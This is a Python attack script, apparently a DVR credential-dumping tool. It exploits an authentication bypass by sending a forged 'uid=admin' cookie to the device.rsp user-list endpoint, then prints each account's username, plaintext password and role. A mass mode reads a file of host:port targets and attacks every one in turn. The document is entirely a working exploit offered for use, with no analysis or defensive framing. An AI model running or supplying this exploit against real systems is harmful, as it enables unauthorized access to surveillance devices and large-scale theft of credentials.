# -*- coding: utf-8 -*-
from __future__ import print_function
import json
import requests
import argparse
import tableprint as tp
import sys

class Colors:
    BLUE        = '\033[94m'
    GREEN       = '\033[32m'
    RED         = '\033[0;31m'
    DEFAULT     = '\033[0m'
    ORANGE      = '\033[33m'
    WHITE       = '\033[97m'
    BOLD        = '\033[1m'
    BR_COLOUR   = '\033[1;37;40m'

banner = '''
                             __..--.._
      .....              .--~  .....  `.
    .":    "`-..  .    .' ..-'"    :". `
    ` `._ ` _.'`"(     `-"'`._ ' _.' '
         ~~~      `.          ~~~
                  .'
                 /
                (
                 ^---'


 [*] @tausifzaman
'''

details = '''
 # version: 1.2
'''

print(Colors.GREEN + banner + Colors.DEFAULT)

parser = argparse.ArgumentParser(prog='getDVR_Credentials.py',
                                description='[+] Obtaining Exposed credentials',
                                epilog='[+] Demo: python cctv.py --host 192.168.1.101 -p 81')
parser.add_argument('--host', dest="HOST", help='Host')
parser.add_argument('--port', dest="PORT", help='Port', default=80)
parser.add_argument('-m', '--mass', help='File with host:port or URL list')
args = parser.parse_args()

def makeReqHeaders(xCookie):
    headers = {}
    headers["Host"]             =  host
    headers["User-Agent"]       = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
    headers["Accept"]           = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    headers["Accept-Languag"]   = "es-AR,en-US;q=0.7,en;q=0.3"
    headers["Connection"]       = "close"
    headers["Content-Type"]     = "text/html"
    headers["Cookie"]           = "uid="+xCookie
    return headers

def process_target(HST, port):
    global host
    fullHost_1  = "http://" + HST + ":" + str(port) + "/device.rsp?opt=user&cmd=list"
    host        = "http://" + HST + ":" + str(port) + "/"

    try:
        rX = requests.get(fullHost_1, headers=makeReqHeaders("admin"), timeout=10.000)
    except Exception:
        print(Colors.RED + f" [+] Timed out for {HST}:{port}\n" + Colors.DEFAULT)
        return

    badJson = rX.text
    try:
        dataJson = json.loads(badJson)
        totUsr = len(dataJson["list"])
    except Exception as e:
        print(" [+] Error: " + str(e))
        print(" [>] json: " + str(rX))
        return

    print(Colors.GREEN + "\n [+] DVR (url):\t\t" + Colors.ORANGE + str(host) + Colors.GREEN)
    print(" [+] Port: \t\t" + Colors.ORANGE + str(port) + Colors.DEFAULT)
    print(Colors.GREEN + "\n [+] Users List:\t" + Colors.ORANGE + str(totUsr) + Colors.DEFAULT)
    print(" ")

    final_data = []
    try:
        for obj in range(0, totUsr):
            temp = []
            _usuario    = dataJson["list"][obj]["uid"]
            _password   = dataJson["list"][obj]["pwd"]
            _role       = dataJson["list"][obj]["role"]
            temp.append(_usuario)
            temp.append(_password)
            temp.append(_role)
            final_data.append(temp)

        hdUsr  = Colors.GREEN + "Username" + Colors.DEFAULT
        hdPass = Colors.GREEN + "Password" + Colors.DEFAULT
        hdRole = Colors.GREEN + "Role ID"  + Colors.DEFAULT
        cabeceras = [hdUsr, hdPass, hdRole]

        tp.table(final_data, cabeceras, width=20)

    except Exception as e:
        print(" [!]: " + str(e))
        print(" [+] " + str(dataJson))
    print(" ")

# --------- Main Logic ---------
if args.mass:
    try:
        with open(args.mass, 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
        total_targets = len(lines)
        for idx, target in enumerate(lines, start=1):
            print(f"[{idx}/{total_targets}] Scanning {target}")
            if "://" in target:
                target = target.replace("http://", "").replace("https://", "")
            if ":" in target:
                ip, port = target.split(":")
            else:
                ip, port = target, 80
            process_target(ip, port)
    except FileNotFoundError:
        print(Colors.RED + f"File not found: {args.mass}" + Colors.DEFAULT)
        sys.exit(1)
elif args.HOST:
    process_target(args.HOST, args.PORT)
else:
    ip = input("[?] Enter Host/IP: ").strip()
    port = input("[?] Enter Port (default 80): ").strip()
    if not port:
        port = 80
    process_target(ip, port)
